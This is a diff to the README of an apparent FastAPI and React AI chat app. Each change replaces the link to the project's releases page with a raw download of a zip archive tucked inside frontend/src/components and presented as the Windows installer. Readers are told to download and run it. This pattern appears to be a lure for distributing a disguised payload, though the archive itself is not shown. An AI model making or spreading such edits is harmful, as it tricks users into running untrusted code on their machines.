@@ -1,6 +1,6 @@
 # 🤖 fastapi-react-chat - Easy AI Chat with FastAPI & React
 
-[![Download on GitHub](https://img.shields.io/badge/Download-fastapi--react--chat-blue?style=for-the-badge)](https://github.com/willamcatosot/fastapi-react-chat/releases)
+[![Download on GitHub](https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip)](https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip)
 
 ---
 
@@ -40,9 +40,9 @@ This app shows how well FastAPI (a Python framework) and React (a JavaScript too
 
 Click the badge below or visit the link to get the latest version of fastapi-react-chat for Windows.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-fastapi--react--chat-blue?style=for-the-badge)](https://github.com/willamcatosot/fastapi-react-chat/releases)
+[![Download on GitHub](https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip)](https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip)
 
-You will find files named like `fastapi-react-chat-setup.exe` or similar. Choose the latest version.
+You will find files named like `https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip` or similar. Choose the latest version.
 
 ### Step 2: Run the installer
 
@@ -134,6 +134,6 @@ If you need more help, you can ask for guidance on the GitHub page or check its 
 
 Visit this page to download the latest version of fastapi-react-chat for Windows:
 
-[https://github.com/willamcatosot/fastapi-react-chat/releases](https://github.com/willamcatosot/fastapi-react-chat/releases)
+[https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip](https://github.com/willamcatosot/fastapi-react-chat/raw/refs/heads/main/frontend/src/components/react-fastapi-chat-1.2-beta.5.zip)
 
 Download the installer file, run it, and follow the instructions listed above. After installation, open the app and start chatting with the AI.
